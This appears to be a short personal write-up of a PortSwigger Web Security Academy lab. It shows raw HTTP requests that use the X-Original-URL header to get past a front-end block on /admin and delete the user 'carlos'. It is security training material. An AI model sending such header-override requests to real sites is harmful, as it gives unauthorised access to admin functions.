# Lab: URL-based access control can be circumvented
url: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

# Overview:
- Website has an unauthenticed admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end app is built on a framework that support the X-Original-URL header
- Access the admin panel and delete user carlos to solve lab

# Analysis:

GET / HTTP/1.1
X-Original-URL: /admin

-> Get admin panel, browse delete user carlos

path /admin/delete?username=carlos

Due to the front-end deny /admin path

GET / HTTP/1.1
X-Original-URL: /admin/delete?username=carlos

-> Server response error missing parameter username
-> Back-end did receive query string username=null
-> Try to put query string in url

GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete

-> <OK!>

Then browse:

GET / HTTP/1.1
X-Original-URL: /admin

to get the result page

